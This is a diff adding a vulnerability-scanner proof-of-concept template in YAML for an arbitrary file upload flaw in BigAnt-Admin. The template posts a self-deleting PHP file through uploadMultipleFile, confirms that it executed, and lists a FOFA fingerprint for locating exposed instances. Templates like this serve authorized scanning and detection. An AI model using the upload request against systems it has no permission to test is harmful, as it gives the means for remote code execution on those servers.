@@ -1,0 +1,32 @@
+id: poc-yaml-jiuqitech-bigant-admin-uploadmultiplefile-anyfile-upload
+info:
+  name: 九麒科技 BigAnt-Admin uploadMultipleFile 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: bigant-admin
+  fofa: app="BigAnt-Admin"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+  time: datetime("2006-01-02")
+requests:
+- method: POST
+  path: /Addin/Upload/uploadMultipleFile.html
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1zY65etyNeQDfyjX
+  data: '------WebKitFormBoundary1zY65etyNeQDfyjX
+
+    Content-Disposition: form-data; name="file"; filename="{{.t1}}.php"
+
+
+    <?php echo md5({{.t1}});unlink(__FILE__);?>
+
+    ------WebKitFormBoundary1zY65etyNeQDfyjX--'
+  expression: status_code == 200
+  output:
+  - regex_match(body,"\"savefile\":\".*/(?P<file>.*?).php")
+- method: GET
+  path: /data/0/admin/{{.time}}/{{.file}}.php
+  expression: status_code == 200 && body == t2
+transport: http
